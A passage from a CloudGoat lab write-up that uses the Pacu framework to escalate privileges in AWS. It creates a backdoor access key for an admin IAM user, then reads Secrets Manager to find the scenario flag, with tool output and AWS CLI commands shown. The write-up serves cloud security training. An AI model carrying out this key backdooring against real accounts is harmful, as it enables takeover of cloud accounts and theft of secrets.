[iam__privesc_scan]     Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: 
[iam__privesc_scan] Data (IAM > Users) not found, run module "iam__enum_users_roles_policies_groups" to fetch it? (y/n) ==y==
[iam__privesc_scan]   Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 5 users
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  4 Users Enumerated
  IAM resources saved in Pacu database.

[iam__privesc_scan] Found 4 user(s). Choose a user below.
[iam__privesc_scan]   [0] Other (Manually enter user name)
[iam__privesc_scan]   [1] cgidkklcl54ir4_admin_user
[iam__privesc_scan]   [2] cgidkklcl54ir4_low_priv_user
[iam__privesc_scan]   [3] cgidkklcl54ir4_low_priv_user
[iam__privesc_scan]   [4] cloudgoat

[iam__privesc_scan] Choose an option: ==1==
[iam__privesc_scan]   Running module iam__backdoor_users_keys...
[iam__backdoor_users_keys] Backdoor the following users?
[iam__backdoor_users_keys]   cgidkklcl54ir4_admin_user
[iam__backdoor_users_keys]     Access Key ID: AKIAYK******************
[iam__backdoor_users_keys]     Secret Key: KJr+NwAyPcI******************
[iam__backdoor_users_keys] iam__backdoor_users_keys completed.

[iam__backdoor_users_keys] MODULE SUMMARY:

  1 user key(s) successfully backdoored.


[iam__privesc_scan] iam__privesc_scan completed.

[iam__privesc_scan] MODULE SUMMARY:

  Privilege escalation was successful
```
We managed to create a second access key for the admin user and Pacu provided us with the newly created access key and secrets for the admin user.
In AWS, each account can have 2 sets of credentials, but before we create the new access key, the admin user only has one set of credentials which enable us to succeed in this scenario.
If the admin user already 2 sets of credentials, this privilege escalation will fail

```
Access Key ID: AKIAYK******************
Secret Key: KJr+NwAyPcIhZ******************
```

### Configure the admin credentials###

We can now pivot to the admin account

```
`┌─[pwnedlabs@cloud]─[~]`
`└──╼ $ aws configure --profile admin`          
`AWS Access Key ID [None]: AKIAYK******************`
`AWS Secret Access Key [None]: KJr+NwAyPcIhZZRgo**********************`
`Default region name [None]: us-east-1`
`Default output format [None]: json`
```

### List  and Read Secrets in SecretManager###

After configuring the admin account, we can proceed to dumping the secret flag.

```aws secretsmanager list-secrets --profile admin```

```

`┌─[pwnedlabs@cloud]─[~]`
`└──╼ $ aws secretsmanager list-secrets --profile admin`                                                 
`{`
    `"SecretList": [`
        `{`
            `"ARN": "arn:aws:secretsmanager:us-east-1:571600863645:secret:cgidkklcl54ir4_final_flag-fypAqi",`
            `"Name": "cgidkklcl54ir4_final_flag",`
            `"LastChangedDate": 1757741851.801,`
            `"LastAccessedDate": 1757721600.0,`
            `"Tags": [`
                `{`
                    `"Key": "Scenario",`
                    `"Value": "beanstalk_secrets"`
                `},`
                `{`
                    `"Key": "Stack",`
                    `"Value": "CloudGoat"`
                `}`
            `],`
            `"SecretVersionsToStages": {`
                `"terraform-20250913053731050200000002": [`
                    `"AWSCURRENT"`
                `]`
            `},`
            `"CreatedDate": 1757741848.823`
        `}`
    `]`
`}`
```

```aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text --profile admin````
```
`┌─[pwnedlabs@cloud]─[~]`
`└──╼ $ aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text --profile admin`
`cgidkklcl54ir4_final_flag`
```
We successfully solved the scenario
 
### Destroying the resources###

After solving the scenario, we should destroy it to prevent the further usage that will cost you money and possible hijacking of your account due the
unsecured scenario cloudgoat create in your account.

```cloudgoat destroy beanstalk_secrets```



